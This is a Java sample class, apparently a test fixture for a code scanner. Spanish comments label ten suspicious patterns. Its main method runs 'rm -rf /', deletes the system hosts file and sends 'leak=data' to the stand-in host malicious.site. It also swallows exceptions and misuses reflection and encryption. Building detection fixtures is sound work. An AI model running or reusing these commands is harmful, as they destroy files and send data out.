package suspicious;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.lang.reflect.Method;
import javax.crypto.Cipher;
import java.util.Base64;
import java.util.zip.ZipOutputStream;

public class SuspiciousSample {
    public static void main(String[] args) {
        try {
            // 1. Llamada peligrosa a exec
            Runtime.getRuntime().exec("rm -rf /");

            // 2. Acceso a archivos del sistema
            File sensitiveFile = new File("C:/Windows/System32/drivers/etc/hosts");
            sensitiveFile.delete();

            // 3. String sospechoso (secreto codificado)
            String secret = "U2VjcmV0UGFzc3dvcmQ="; // Base64
            byte[] decoded = Base64.getDecoder().decode(secret);

            // 4. Uso de reflexión
            Class<?> clazz = Class.forName("java.lang.System");
            Method exitMethod = clazz.getMethod("exit", int.class);
            exitMethod.invoke(null, 0);

            // 5. Criptografía
            Cipher cipher = Cipher.getInstance("AES");
            cipher.init(Cipher.ENCRYPT_MODE, null); // Clave null solo como ejemplo

            // 6. Bloque catch vacío
            try {
                int a = 1 / 0;
            } catch (Exception e) {
                // Ignorado a propósito
            }

            // 7. Clase anónima con nombre corto (sospechoso)
            Runnable r = new Runnable() {
                public void run() {
                    System.out.println("Running...");
                }
            };
            r.run();

            // 8. Exfiltración de datos
            HttpURLConnection conn = (HttpURLConnection) new URL("http://malicious.site/steal").openConnection();
            conn.setDoOutput(true);
            conn.getOutputStream().write("leak=data".getBytes());

            // 9. Zip para ocultar o preparar extracción
            FileOutputStream fos = new FileOutputStream("hidden.zip");
            ZipOutputStream zos = new ZipOutputStream(fos);
            zos.close();

            // 10. Acceso a su propia ruta
            String path = SuspiciousSample.class.getProtectionDomain().getCodeSource().getLocation().getPath();
            File self = new File(path);
            byte[] code = new FileInputStream(self).readAllBytes();

        } catch (Exception ignored) {
        }
    }
}
